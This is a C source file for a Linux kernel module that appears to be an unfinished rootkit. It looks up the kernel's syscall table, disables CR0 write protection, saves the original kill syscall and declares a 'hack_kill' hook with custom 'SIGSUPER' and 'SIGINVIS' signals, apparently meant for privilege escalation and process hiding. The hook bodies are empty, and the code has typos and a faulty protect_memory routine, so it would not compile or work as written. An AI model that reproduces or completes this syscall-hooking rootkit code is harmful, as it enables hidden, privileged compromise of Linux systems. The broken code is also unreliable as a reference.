#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
MODULE_LICENSE("GPL");

unsigned long *_syscall_table_address;




#ifdef CONFIG_X86_64

#if LINUX_VERSION_CODE>=KERNAL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage  long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t  orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill ;
#endif 
#endif



enum signals {
SIGSUPER=64,
SIGINVIS=63;
};
 



#if PTREGS_SYSCALL_STUB 


static asmlinkage long hack_kill(const struct pt_regs *regs)
{
int sig = regs->si;

if(sig==SIGSUPER)


}


#else

static asmlinkage long hack_kill(pid_t pid,int sig){



}
#endif


static int store(void){

#if PTREGS_SYSCALL_STUB
	orig_kill=(ptreg_t)_syscall_table_address[__NR_kill];

#else
	orig_kill=(orig_kill_t)_syscall_table_address[__NR_kill];
#endif


return 0;
}





static int hook(void){


return 0;


}






static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static void unprotect_memory(void){
write_cr0_forced(read_cr0() & (~ 0x10000));
printk(KERN_INFO "memory unprotected");
}



static void protect_memory(void){
write_cr0_forced(read_cr0() | (~ 0x10000));
printk(KERN_INFO "memory protected");
}


static unsigned long *_get_table_address(void){

unsigned long *syscall_table;

syscall_table=(unsigned long*)kallsyms_lookup_name("sys_call_table");
return  syscall_table;
}

static int __init  entry(void){
int err =1; 
printk(KERN_INFO " hbfjndf");

_syscall_table_address=_get_table_address();


if(!_syscall_table_address){

printk(KERN_INFO "error: syscall_table =null");
return err;

}

return 0;
}

static  void __exit  exity(void){

int err=1;

printk(KERN_INFO "Module unloaded.\n");
}


module_init(entry);
module_exit(exity)
